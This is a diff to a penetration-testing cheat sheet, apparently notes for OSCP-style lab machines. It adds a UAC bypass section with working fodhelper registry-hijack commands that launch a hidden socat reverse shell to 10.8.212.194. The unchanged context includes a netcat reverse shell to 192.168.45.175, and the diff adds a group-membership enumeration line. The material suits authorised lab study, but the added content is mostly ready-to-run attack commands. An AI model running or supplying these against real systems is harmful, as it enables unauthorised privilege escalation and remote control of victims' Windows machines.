@@ -2,6 +2,7 @@
 - [General](#general)
   - [Important Files](#important-files)
   - [Reverse Shell](#reverse-shell)
+  - [UAC Bypass](#uac-bypass)
 - [PG Grounds & HTB]
   - [Linux Boxes](#linux-boxes)
 
@@ -80,6 +81,28 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 # when using os
 os.system('nc 192.168.45.175 80 -e /bin/sh')
 ```
+
+## UAC Bypass
+- Auto elevation
+  - msconfig
+  - azman.msc
+- Using fodhelper
+```bash
+# first fire up netcat listener
+
+# method1 
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4444 EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+
+# method2
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4445 EXEC:cmd.exe,pipes"
+reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+fodhelper.exe
+```
+
 
 # Linux Boxes
 ## Proving Grounds
@@ -365,6 +388,8 @@ whoami
 whoami /priv
 whoami /groups
 whoami /all
+net user attacker | find "Local Group"
+  -> If user is a member of administrators maybe UACME will be required
 
 #Existing users and groups
 net user
